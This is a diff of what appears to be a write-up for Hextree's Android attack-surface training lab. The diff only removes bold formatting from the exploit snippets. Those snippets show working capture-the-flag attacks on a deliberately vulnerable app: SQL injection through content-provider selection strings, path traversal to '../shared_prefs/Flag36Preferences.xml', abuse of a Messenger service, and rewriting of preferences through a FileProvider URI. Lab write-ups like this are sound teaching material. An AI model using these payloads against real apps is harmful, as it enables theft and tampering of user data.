@@ -547,7 +547,7 @@ IncomingHandler() {super(Looper.getMainLooper());}
           Log.i("MessageReply1234", reply.toString());
           Log.d("MessageReply1234", "Obtained password: " + obtainedPassword);
           
-          **getFlag(obtainedPassword);**
+          getFlag(obtainedPassword);
       }
       else{
           Log.i("Message1234", "NO Reply");
@@ -560,8 +560,8 @@ private ServiceConnection connection = new ServiceConnection() {
   public void onServiceConnected(ComponentName name, IBinder binder) {
       serviceMessenger = new Messenger(binder);
       isBound = true;
-      **// Start by getting the secret
-      requestPassword();**
+      // Start by getting the secret
+      requestPassword();
   }
   @Override
   public void onServiceDisconnected(ComponentName name) {
@@ -582,7 +582,7 @@ private void requestPassword() {
 }
 // Method to request the flag
 private void getFlag(String Password) {
-    **// First, send "give flag" echo**
+    // First, send "give flag" echo
     Message msg = Message.obtain(null, 1);
     Bundle bundle = new Bundle();
     bundle.putString("echo", "give flag");
@@ -594,7 +594,7 @@ private void getFlag(String Password) {
         e.printStackTrace();
     }
 
-    **// Now, send the retrevied password with int = 3 to get flag**
+    // Now, send the retrevied password with int = 3 to get flag
     msg = Message.obtain(null, 3);
     bundle = new Bundle();
     bundle.putString("password", Password);
@@ -788,7 +788,7 @@ Uri uri = Uri.parse("content://io.hextree.flag32/flags");
 
 // Full Query looks like:
 // SELECT * FROM Flag WHERE visible=1 AND (1) UNION SELECT * FROM Flag WHERE visible=0 AND (1);
-Cursor cursor = resolver.query(uri, null, **"1) UNION SELECT * FROM Flag WHERE visible=0 AND (1"**, null, null);
+Cursor cursor = resolver.query(uri, null, "1) UNION SELECT * FROM Flag WHERE visible=0 AND (1", null, null);
 
 if (cursor != null) {
     // Retrieves all column names
@@ -823,7 +823,7 @@ super.onActivityResult(requestCode, resultCode, data);
 
 ContentResolver resolver = getContentResolver();
 // injecting the selection field which is WHERE clause: SELECT * FROM Flag WHERE _id=2 UNION SELECT 1,title,content,'a' FROM Note
-Cursor cursor = resolver.query(data.getData(), null, **"_id=2 UNION SELECT 1,title,content,'a' FROM Note"**, null, null);
+Cursor cursor = resolver.query(data.getData(), null, "_id=2 UNION SELECT 1,title,content,'a' FROM Note", null, null);
 
 if (cursor != null) {
     String[] columnNames = cursor.getColumnNames();
@@ -926,7 +926,7 @@ Uri uriForFile = FileProvider.getUriForFile(this, "io.hextree.root", new File(ge
 Intent intent = new Intent();
 intent.setData(uriForFile);
 intent.addFlags(3);
-**setResult(0, intent);**
+setResult(0, intent);
 return;
 }
 // Returns the absolute path to the directory on the filesystem where files created
@@ -934,7 +934,7 @@ Uri uriForFile2 = FileProvider.getUriForFile(this, "io.hextree.files", new File(
 Intent intent2 = new Intent();
 intent2.setData(uriForFile2);
 intent2.addFlags(3);
-**setResult(-1, intent2);**
+setResult(-1, intent2);
 }
 ```
 
@@ -951,7 +951,7 @@ protected void onCreate(Bundle savedInstanceState) {
   setContentView(R.layout.activity_main);
 
   Intent intent = new Intent();
-  **intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");**
+  intent.putExtra("filename", "../shared_prefs/Flag36Preferences.xml");
   intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag35Activity");
   startActivityForResult(intent, 42);
 }
@@ -966,7 +966,7 @@ protected void onActivityResult(int requestCode, int resultCode, Intent data) {
       BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
       String line;
 
-      **while ((line = reader.readLine()) != null) {
+      while ((line = reader.readLine()) != null) {
           // Replace false with true
           line = line.replaceAll("false", "true");
           stringBuilder.append(line).append("\n");
@@ -976,7 +976,7 @@ protected void onActivityResult(int requestCode, int resultCode, Intent data) {
       // Write the modified content back to the file
       OutputStream outputStream = getContentResolver().openOutputStream(data.getData());
       outputStream.write(stringBuilder.toString().getBytes());
-      outputStream.close();**
+      outputStream.close();
 	  // restart the app to take effect
       Intent openFlag36Activity = new Intent();
       openFlag36Activity.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag36Activity");
